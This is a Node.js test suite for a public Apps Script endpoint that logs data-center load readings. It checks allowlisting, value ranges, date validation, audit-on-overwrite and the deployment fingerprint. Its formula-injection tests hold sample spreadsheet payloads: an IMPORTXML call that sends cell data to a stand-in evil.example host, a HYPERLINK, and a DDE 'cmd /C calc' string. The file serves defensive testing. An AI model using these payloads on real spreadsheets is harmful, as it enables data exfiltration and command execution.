/* =============================================================
   test_hardening.js

   Code.gs is reachable by anyone holding the public URL. These tests post
   to it the way a stranger could, and check that nothing gets into the
   sheet that should not - while a real round, built exactly the way
   load-reading.js builds it, still saves in full.

       node apps-script/test_hardening.js
   ============================================================= */
'use strict';

const fs   = require('fs');
const path = require('path');
const { loadConfig, build, keyOf, ratedFromBreaker } = require('./build_allowlist.js');

const CODE = path.join(__dirname, 'Code.gs');
const HEADER = ['Timestamp','Date','Time','Taken by','Site','Category','Equipment','Circuit',
                'Rack','Rated A','R','Y','B','Max A','% loaded','Unbalance %','Remarks'];
const COL = {}; HEADER.forEach((h, i) => { COL[h] = i; });

/* ---------------------------------------------------------------- mocks */

let SHEETS = {};
let auditBroken = false;

function makeSheet(name, rows) {
    const g = rows.map(r => r.slice());
    return {
        _g: g,
        getLastRow: () => g.length,
        setFrozenRows() {},
        getRange(r, c, nr, nc) {
            return {
                getValues() {
                    const o = [];
                    for (let i = 0; i < nr; i++) { const s = g[r - 1 + i] || []; o.push(s.slice(c - 1, c - 1 + nc)); }
                    return o;
                },
                setValues(v) {
                    if (name === 'Audit' && auditBroken) throw new Error('Audit tab is protected');
                    v.forEach((row, i) => {
                        const y = r - 1 + i;
                        while (g.length <= y) g.push([]);
                        row.forEach((x, j) => { g[y][c - 1 + j] = x; });
                    });
                },
                setFontWeight() { return this; }
            };
        }
    };
}

function reset(rows) {
    SHEETS = { 'Load Readings': makeSheet('Load Readings', [HEADER].concat(rows || [])) };
    auditBroken = false;
}

global.SpreadsheetApp = {
    getActiveSpreadsheet: () => ({
        getSheetByName: n => SHEETS[n] || null,
        insertSheet: n => (SHEETS[n] = makeSheet(n, [])),
        getSpreadsheetTimeZone: () => 'Asia/Kuwait'
    })
};
global.LockService = { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) };
global.ContentService = { MimeType: { JSON: 'json' },
    createTextOutput: s => ({ _s: s, setMimeType() { return this; } }) };
global.Utilities = { formatDate: d => {
    const p = n => String(n).padStart(2, '0');
    return d.getFullYear() + '-' + p(d.getMonth() + 1) + '-' + p(d.getDate());
} };

/* Indirect eval runs Code.gs in global scope, as Apps Script does. A direct
   eval under 'use strict' would keep its vars - ALLOWED, LIMITS - private. */
(0, eval)(fs.readFileSync(CODE, 'utf8'));

const post = b => JSON.parse(doPost({ postData: { contents: JSON.stringify(b) } })._s);
const rawPost = s => JSON.parse(doPost({ postData: { contents: s } })._s);
const main  = () => SHEETS['Load Readings']._g;
const audit = () => SHEETS['Audit'] ? SHEETS['Audit']._g : null;
const written = () => main().length - 1;

let pass = 0, fail = 0;
function check(name, got, want) {
    const ok = JSON.stringify(got) === JSON.stringify(want);
    console.log('  %s  %s%s', ok ? 'PASS' : 'FAIL', name,
                ok ? '' : '\n        got  ' + JSON.stringify(got) + '\n        want ' + JSON.stringify(want));
    ok ? pass++ : fail++;
}
function section(t) { console.log('\n' + t); }

/* A day that passes checkDate: recent, not in the future. */
const DAY = '2026-08-16';
const META = { date: DAY, time: '09:30', takenBy: 'Jais', site: 'KOC Data Center', remarks: '' };

/* A PDU way that exists, and one main feeder, taken from the real config. */
const cfg = loadConfig();
const WAY = { category: 'PDU', equipment: 'PDU 1', circuit: 'Q1' };
const WAY_SPEC = cfg.pduCircuits['PDU 1'].find(c => c.c === 'Q1');
const WAY_RATED = ratedFromBreaker(WAY_SPEC.breaker);
const FEEDER = { category: 'Main', equipment: 'Incomer A', circuit: '' };

function reading(where, r, y, b, extra) {
    return Object.assign({}, where, { rack: '', rated: '', r: r, y: y, b: b,
                                       max: '', pct: '', unbalance: '', replace: false }, extra || {});
}

/* ======================================================== the allowlist is current */
section('Code.gs allowlist matches config.js');
{
    const want = build(cfg);
    check('same number of rows', Object.keys(ALLOWED).length, Object.keys(want).length);
    const drift = Object.keys(want).filter(k =>
        !ALLOWED[k] || ALLOWED[k][0] !== want[k].rack || ALLOWED[k][1] !== want[k].rated);
    check('no row differs (else re-run build_allowlist.js)', drift.slice(0, 5), []);
    const extra = Object.keys(ALLOWED).filter(k => !want[k]);
    check('no stale rows left in Code.gs', extra.slice(0, 5), []);
}

/* ======================================================== a real round still saves */
section('A real round, built exactly as load-reading.js builds it');
{
    reset();
    /* every row the page can send - main feeders and every PDU way - using
       the page's own keyOf / ratedFromBreaker and payload shape */
    const rows = [];
    cfg.equipment.forEach(e => rows.push({
        category: 'Main', equipment: e.name, circuit: '', rack: '', rated: e.rated,
        r: 100, y: 101, b: 99, max: 101, pct: 0, unbalance: 1, replace: false }));
    Object.keys(cfg.pduCircuits).forEach(pdu => cfg.pduCircuits[pdu].forEach(c => {
        const three = c.ph === '3';
        rows.push({
            category: 'PDU', equipment: pdu, circuit: c.c, rack: c.rack,
            rated: ratedFromBreaker(c.breaker),
            r: three || c.ph === 'R' ? 5.5 : '', y: three || c.ph === 'Y' ? 6 : '',
            b: three || c.ph === 'B' ? 5 : '', max: 6, pct: 0, unbalance: '', replace: false });
    }));
    const d = post({ type: 'load-reading', meta: META, rows: rows });
    check('succeeds', d.result, 'success');
    check('every row saved (' + rows.length + ')', d.saved.length, rows.length);
    check('none rejected', d.rejected, []);
    check('sheet holds them all', written(), rows.length);
}

/* ======================================================== routing */
section('Only the three request types do anything');
{
    reset();
    check('no type at all -> refused', post({ meta: META, rows: [reading(WAY, 1, 1, 1)] }).result, 'error');
    check('  ... and nothing written', written(), 0);
    check('unknown type -> refused', post({ type: 'drop-table', rows: [] }).message, 'Unknown request type');
    check('not an object -> refused', rawPost('"hello"').result, 'error');
    check('null -> refused', rawPost('null').result, 'error');
    check('broken JSON -> refused', rawPost('{not json').result, 'error');
    check('sheet still empty', written(), 0);
}

/* ======================================================== allowlist */
section('Only real feeders and PDU ways can be written');
{
    reset();
    let d = post({ type: 'load-reading', meta: META,
                   rows: [reading({ category: 'PDU', equipment: 'PDU 99', circuit: 'Q1' }, 1, 1, 1)] });
    check('invented PDU -> rejected', d.rejected.length, 1);
    check('  ... not written', written(), 0);

    d = post({ type: 'load-reading', meta: META,
               rows: [reading({ category: 'Main', equipment: 'Hacker Board', circuit: '' }, 1, 1, 1)] });
    check('invented feeder -> rejected', d.rejected.length, 1);

    d = post({ type: 'load-reading', meta: META,
               rows: [reading({ category: 'Admin', equipment: 'Incomer A', circuit: '' }, 1, 1, 1)] });
    check('real name, wrong category -> rejected', d.rejected.length, 1);
    check('sheet still empty', written(), 0);

    reset();
    d = post({ type: 'load-reading', meta: META,
               rows: [reading(WAY, 3, 3, 3), reading({ category: 'PDU', equipment: 'PDU 99', circuit: 'Q1' }, 1, 1, 1)] });
    check('mixed request: good row saved', d.saved.length, 1);
    check('mixed request: bad row rejected', d.rejected.length, 1);
    check('mixed request: bad row named', d.rejected[0].key, 'PDU|PDU 99|Q1');

    reset();
    d = post({ type: 'load-reading', meta: META, rows: [reading(WAY, 3, 3, 3), reading(WAY, 9, 9, 9)] });
    check('same row twice in one request: first saved', d.saved.length, 1);
    check('  ... second rejected', d.rejected.length, 1);
    check('  ... the first value kept', main()[1][COL.R], 3);
}

/* ======================================================== currents */
section('Currents must be real numbers in range');
{
    const cases = [
        ['negative', -5, 'R phase is negative'],
        ['text', 'lots', 'R phase is not a number'],
        ['a formula', '=1+1', 'R phase is not a number'],
        ['exponent trick', '1e9', 'R phase is not a number'],
        ['beyond the site', 9999, 'R phase 9999 A is beyond anything on this site']
    ];
    cases.forEach(([what, v, msg]) => {
        reset();
        const d = post({ type: 'load-reading', meta: META, rows: [reading(WAY, v, 1, 1)] });
        check(what + ' -> rejected', d.rejected.length ? d.rejected[0].reason : '(saved)', msg);
    });

    reset();
    let d = post({ type: 'load-reading', meta: META, rows: [reading(WAY, '', '', '')] });
    check('no current at all -> rejected', d.rejected[0] && d.rejected[0].reason, 'No current entered');

    reset();
    d = post({ type: 'load-reading', meta: META, rows: [reading(WAY, '12.5', '12', '11.5')] });
    check('numbers sent as text are accepted', d.saved.length, 1);
    check('  ... and stored as numbers', main()[1][COL.R], 12.5);

    /* The one that matters: an overload must NOT be refused. */
    reset();
    const over = WAY_RATED * 1.6;
    d = post({ type: 'load-reading', meta: META, rows: [reading(WAY, over, over, over)] });
    check('reading 60 % over its breaker rating is ACCEPTED', d.saved.length, 1);
    check('  ... and shows as over 100 %', main()[1][COL['% loaded']] > 100, true);
}

/* ======================================================== canonical values */
section('Rack, rating and derived figures come from the server, not the request');
{
    reset();
    const lie = reading(WAY, 10, 10, 10, {
        rack: 'CEO OFFICE', rated: 9999, max: 1, pct: 0.1, unbalance: 99 });
    post({ type: 'load-reading', meta: META, rows: [lie] });
    const row = main()[1];
    check('rack is the drawing\'s, not the request\'s', row[COL.Rack], WAY_SPEC.rack);
    check('rating is the breaker\'s, not the request\'s', row[COL['Rated A']], WAY_RATED);
    check('Max A recomputed', row[COL['Max A']], 10);
    check('% loaded recomputed from the real rating', row[COL['% loaded']],
          Math.round(10 / WAY_RATED * 1000) / 10);
    check('unbalance recomputed', row[COL['Unbalance %']], 0);

    /* unbalance must match the page's NEMA formula exactly */
    reset();
    post({ type: 'load-reading', meta: META, rows: [reading(FEEDER, 1036, 991, 1031)] });
    const avg = (1036 + 991 + 1031) / 3;
    const nema = Math.round(Math.max(Math.abs(1036 - avg), Math.abs(991 - avg), Math.abs(1031 - avg)) / avg * 1000) / 10;
    check('unbalance matches load-reading.js (Incomer A, 16-08)', main()[1][COL['Unbalance %']], nema);
    check('  ... which is 2.8 %', nema, 2.8);

    reset();
    const single = cfg.pduCircuits['PDU 1'].find(c => c.ph === 'R');
    post({ type: 'load-reading', meta: META,
           rows: [reading({ category: 'PDU', equipment: 'PDU 1', circuit: single.c }, 7, '', '')] });
    check('single-phase way: unbalance blank', main()[1][COL['Unbalance %']], '');
}

/* ======================================================== formula injection */
section('Nothing a request sends can become a formula');
{
    const attacks = [
        '=IMPORTXML("http://evil.example/?d="&A1,"//x")',
        '+HYPERLINK("http://evil.example","click")',
        '-1+cmd|" /C calc"!A0',
        '@SUM(A1:A9)'
    ];
    attacks.forEach(a => {
        reset();
        post({ type: 'load-reading', meta: Object.assign({}, META, { takenBy: a }), rows: [reading(WAY, 1, 1, 1)] });
        const v = main()[1][COL['Taken by']];
        check('"' + a.slice(0, 14) + '..." stored as text', v.charAt(0), "'");
    });

    reset();
    post({ type: 'load-reading', meta: Object.assign({}, META, { site: '=HACK()', remarks: '=EVIL()' }),
           rows: [reading(WAY, 1, 1, 1)] });
    check('site neutralised', main()[1][COL.Site].charAt(0), "'");
    check('remarks neutralised', main()[1][COL.Remarks].charAt(0), "'");

    reset();
    post({ type: 'load-reading', meta: Object.assign({}, META, { takenBy: 'Jais\u0000\u001b[31m\nX\u007f' }),
           rows: [reading(WAY, 1, 1, 1)] });
    check('control characters stripped', /[\u0000-\u001F\u007F]/.test(main()[1][COL['Taken by']]), false);

    reset();
    post({ type: 'load-reading', meta: Object.assign({}, META, { takenBy: 'x'.repeat(5000) }),
           rows: [reading(WAY, 1, 1, 1)] });
    check('long text capped', main()[1][COL['Taken by']].length, LIMITS.MAX_TEXT);

    reset();
    post({ type: 'load-reading', meta: META, rows: [reading(WAY, 1, 1, 1)] });
    check('an ordinary name is left alone', main()[1][COL['Taken by']], 'Jais');
}

/* ======================================================== the header */
section('The reading date and time are checked');
{
    const bad = [
        ['not a date', 'yesterday', 'Reading date must be yyyy-mm-dd'],
        ['impossible date', '2026-02-30', 'Reading date 2026-02-30 is not a real date'],
        ['too early', '1999-01-01', 'Reading date 1999-01-01 is too early'],
        ['far future', '2099-01-01', 'Reading date 2099-01-01 is in the future'],
        ['a formula', '=NOW()', 'Reading date must be yyyy-mm-dd']
    ];
    bad.forEach(([what, date, msg]) => {
        reset();
        const d = post({ type: 'load-reading', meta: Object.assign({}, META, { date: date }),
                         rows: [reading(WAY, 1, 1, 1)] });
        check(what + ' -> whole request refused', d.message, msg);
    });
    check('nothing written by any of them', written(), 0);

    reset();
    let d = post({ type: 'load-reading', meta: Object.assign({}, META, { time: '25:99' }),
                   rows: [reading(WAY, 1, 1, 1)] });
    check('bad time -> refused', d.message, 'Time must be hh:mm');

    reset();
    d = post({ type: 'load-reading', meta: Object.assign({}, META, { time: '' }), rows: [reading(WAY, 1, 1, 1)] });
    check('blank time is fine', d.saved.length, 1);

    reset();
    const many = Array.from({ length: LIMITS.MAX_ROWS + 1 }, () => reading(WAY, 1, 1, 1));
    d = post({ type: 'load-reading', meta: META, rows: many });
    check('over ' + LIMITS.MAX_ROWS + ' rows -> refused', d.result, 'error');
    check('  ... nothing written', written(), 0);
}

/* ======================================================== overwrites */
section('Overwriting a reading keeps a copy of what it replaced');
{
    reset();
    post({ type: 'load-reading', meta: META, rows: [reading(FEEDER, 1036, 991, 1031)] });

    let d = post({ type: 'load-reading', meta: META, rows: [reading(FEEDER, 5, 5, 5)] });
    check('without replace: refused as duplicate', d.duplicates.length, 1);
    check('  ... original kept', main()[1][COL.R], 1036);
    check('  ... no audit written', audit(), null);

    d = post({ type: 'load-reading', meta: META, rows: [reading(FEEDER, 5, 5, 5, { replace: true })] });
    check('with replace: overwritten', d.replaced.length, 1);
    check('  ... sheet shows the new value', main()[1][COL.R], 5);
    check('  ... Audit tab created', !!audit(), true);
    const a = audit();
    check('  ... Audit header written', a[0].slice(0, 3), ['Audited at', 'Sheet row', 'Version']);
    check('  ... "before" row keeps the real reading', [a[1][2], a[1][3 + COL.R]], ['before', 1036]);
    check('  ... "after" row holds the new one', [a[2][2], a[2][3 + COL.R]], ['after', 5]);
    check('  ... both name the sheet row', [a[1][1], a[2][1]], [2, 2]);

    /* fail closed: no copy, no overwrite */
    reset();
    post({ type: 'load-reading', meta: META, rows: [reading(FEEDER, 1036, 991, 1031)] });
    post({ type: 'load-reading', meta: META, rows: [reading(FEEDER, 1, 1, 1, { replace: true })] }); // makes the tab
    main()[1][COL.R] = 1036;                       // put the real reading back
    auditBroken = true;
    d = post({ type: 'load-reading', meta: META, rows: [reading(FEEDER, 7, 7, 7, { replace: true })] });
    check('audit copy fails -> overwrite refused', d.rejected.length, 1);
    check('  ... real reading left untouched', main()[1][COL.R], 1036);
}

/* ======================================================== nothing else broke */
section('Status and history still answer');
{
    reset();
    post({ type: 'load-reading', meta: META, rows: [reading(FEEDER, 1036, 991, 1031)] });
    const st = post({ type: 'status', date: DAY });
    check('status succeeds', st.result, 'success');
    check('status sees the reading', !!st.recorded['Main|Incomer A|'], true);
    const h = post({ type: 'history', from: '2026-01-01', to: '2026-12-31' });
    check('history succeeds', h.result, 'success');
}

/* ======================================================== which Code.gs is deployed */
section('The fingerprint identifies exactly this Code.gs');
{
    const { fingerprint, stampedIn } = require('./build_allowlist.js');
    const text = fs.readFileSync(CODE, 'utf8');

    check('stamped value is the hash of the file around it (else run build_allowlist.js)',
          stampedIn(text), fingerprint(text));
    check('it is a real stamp, not the placeholder', /^[0-9a-f]{12}$/.test(stampedIn(text)), true);

    reset();
    const g = JSON.parse(doGet()._s);
    check('the plain /exec response reports it', g.code, CODE_FINGERPRINT);
    check('  ... and how many feeders the server knows', g.feeders, Object.keys(ALLOWED).length);

    /* Git rewrites line endings on this machine; the same file must give the
       same fingerprint however it was saved or copied. */
    const lf = text.replace(/\r\n?/g, '\n');
    check('same fingerprint with LF or CRLF line endings',
          fingerprint(lf.replace(/\n/g, '\r\n')), fingerprint(lf));

    /* ...but any real edit must move it, logic as much as the equipment list. */
    check('a one-character change to the logic changes it',
          fingerprint(text.replace('MAX_AMPS:   5000', 'MAX_AMPS:   5001')) !== fingerprint(text), true);
    check('a changed rack label changes it',
          fingerprint(text.replace('"Cabin H-12"', '"Cabin H-12 SPARE"')) !== fingerprint(text), true);
}

console.log('\n%d passed, %d failed\n', pass, fail);
process.exit(fail ? 1 : 0);
